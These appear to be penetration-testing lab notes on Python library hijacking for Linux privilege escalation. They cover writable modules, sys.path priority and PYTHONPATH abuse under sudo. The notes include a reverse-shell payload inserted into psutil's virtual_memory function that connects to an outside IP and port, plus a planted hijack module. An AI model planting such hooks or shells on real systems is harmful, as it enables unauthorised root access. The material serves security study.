Three basic vulnerabilities where hijacking can be used:
1. Wrong write permissions
2. Library Path
3. PYTHONPATH environmnet variable

## Wrong Write Permissions

If SUID/SGID permissions have been assinged to the Python script that imports a module with bad permissions, our code will automatically be included

**Python Script with SUID set
```shell-session
ls -l mem_status.py
```
- shows s as a permission

Say the Python script has this:
```shell-session
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```
- We notice it uses psutil for the virtual_memory() function

**Check if module has write permissions for us
```shell-session
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

**Insert right at the beginning of the function the hijacking
```shell-session
def virtual_memory():

	...SNIP...
	#### Hijacking
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.15.34", 9001))  # Replace with your IP and port
        os.dup2(s.fileno(), 0)  # stdin
        os.dup2(s.fileno(), 1)  # stdout
        os.dup2(s.fileno(), 2)  # stderr
        subprocess.call(["/bin/sh", "-i"])

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret
```

**Run script as sudo
```shell-session
sudo /usr/bin/python3 ./mem_status.py
```
- Now, we can put a reverse shell and run as root


## Library Path

Requirements:
1. The module that is imported by the script is located under one of the lower priority paths listed via the PYTHONPATH variable
2. We must have write permissions to one of the paths having priority on the list.

Python imports modules based on a priority list
```shell-session
python3 -c 'import sys; print("\n".join(sys.path))'
```

**Psutil Default Installation Location
```shell-session
pip3 show psutil
```

Based on this priority list, we find that /usr/lib/python3.8 is higher on the list than /usr/local/lib/python3.8/dist-packages and is also writable, so we meet the requirements.

**Create Hijacked Module Contents - psutil.py in /usr/lib/python3.8
```shell-session
#!/usr/bin/env python3

import os

def virtual_memory():
  os.system('id')
```
- The hijacked module must have the same name as the import and same function with correct amount of arguments in order to run

**Privilege Escalation via Hijacking Python Library Path
```shell-session
sudo /usr/bin/python3 mem_status.py
```

## PYTHONPATH Environment Variable

PYTHONPATH is an environment variable that indicates what directory Python can search for modules to import

**Check sudo permissions
```shell-session
sudo -l
```
- If /usr/bin/python3 can be run with sudo, we can do this

**Privilege Escalation using PYTHONPATH Environment Variable
```shell-session
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```
- We moved the previous python script from /usr/lib/python3.8 to /tmp
